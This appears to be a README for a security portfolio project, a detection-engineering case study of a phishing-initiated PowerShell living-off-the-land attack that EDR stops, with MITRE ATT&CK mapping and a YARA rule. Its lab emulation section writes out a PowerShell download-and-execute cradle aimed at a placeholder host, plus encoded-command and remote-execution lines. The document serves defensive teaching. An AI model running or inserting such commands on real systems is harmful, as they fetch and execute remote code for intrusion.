# 🔐 Detection Engineering Case Study
## Phishing → PowerShell (Living off the Land) → EDR Block

**Visualized Attack Vector:**

<img width="1536" height="1024" alt="ChatGPT Image 15 янв  2026 г , 19_44_10" src="https://github.com/user-attachments/assets/1f91e07a-db87-498f-8908-fcf9ced3de8e" />
*The diagram is constructed to demonstrate the Lateral Movement stage.*

**SIEM Monitoring:**

<img width="1536" height="1024" alt="ChatGPT Image 15 янв  2026 г , 19_40_22" src="https://github.com/user-attachments/assets/6c7a97c7-0add-43b1-b266-0052325ea1ea" />

*Dashboard with personal data (PII/NDA) blacked out.*
---

## 📌 Overview
This repository contains a **full SOC / Detection Engineering case study** demonstrating the detection and prevention of a **fileless Living off the Land (LOTL) attack** using **PowerShell**, **EDR telemetry**, and **YARA memory scanning**.

The goal of this project is to showcase **Detection-as-Code**, realistic attack emulation, and SOC-grade documentation suitable for a professional security portfolio.

---

## 🎯 Scenario Summary
An attacker gains initial access via **phishing email**, executes an **obfuscated PowerShell payload** on a user workstation, attempts **lateral movement** to an administrative server, and is ultimately **blocked by EDR** before reaching the target database.

**Outcome:** Attack detected and stopped at the administrative server stage.

---

## 🧠 Threat Model

| Kill Chain Stage | Description | MITRE ATT&CK |
|-----------------|-------------|--------------|
| Initial Access | Phishing Email | T1566 |
| Execution | PowerShell (EncodedCommand) | T1059.001 |
| Defense Evasion | Base64 / IEX Obfuscation | T1027 |
| Lateral Movement | PowerShell Remoting | T1021 |
| Detection | Admin Server Telemetry | — |
| Prevention | EDR Process Termination | — |

---

## 🗺️ Attack Flow Diagram

**Flow:**
```
External Attacker
   ↓ (Phishing Email)
User-PC
   ↓ (PowerShell Remote Management)
Admin-SRV  ⚡ Detection Point
   ✖ Blocked by EDR
Customer-DB
```

See: `attack-flow.png`

---

## 🧪 Attack Emulation (Lab)

> ⚠️ Performed in an isolated lab environment for educational purposes only.

### Step 1 — Initial PowerShell Execution
```powershell
powershell.exe -EncodedCommand <Base64Payload>
```

Characteristics:
- No file written to disk
- Obfuscated command execution

---

### Step 2 — Living off the Land Payload Staging
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://malicious.test/payload.ps1")
```

Techniques:
- LOLBins (PowerShell)
- In-memory payload execution

---

### Step 3 — Lateral Movement Attempt
```powershell
Invoke-Command -ComputerName Admin-SRV -ScriptBlock { whoami }
```

---

## 🚨 Detection & Response

**Detection occurred on:** `Admin-SRV`

EDR detected a correlation of:
- Encoded PowerShell execution
- Network-based payload delivery
- In-memory execution patterns

**EDR Response:**
- Process terminated
- Remote session blocked
- No persistence achieved

---

## 🛡️ YARA Detection Rule

The repository includes a **YARA rule** designed to detect LOTL PowerShell attacks executed in memory.

📄 File: `detection/yara/lotl_powershell_inmemory.yar`

Detection logic combines:
- Obfuscation indicators
- LOLBins usage
- Network staging
- Reflective execution artifacts

---

## 🧩 Detection Engineering Value

This project demonstrates:
- Behavior-based detection (no hashes)
- Memory-focused threat hunting
- Mapping detections to MITRE ATT&CK
- SOC-grade documentation and workflow

---

 

---

## 👤 Author
**JR.dev**  
SOC Analyst / Detection Engineering Portfolio

---

## ⚠️ Disclaimer
This project is for **educational and defensive security purposes only**. All attack simulations were conducted in a controlled lab environment.

---

## ⭐ Why This Matters
Modern attacks frequently avoid malware binaries. This case study focuses on **detecting attacker behavior**, not files — a critical skill for modern Blue Teams.

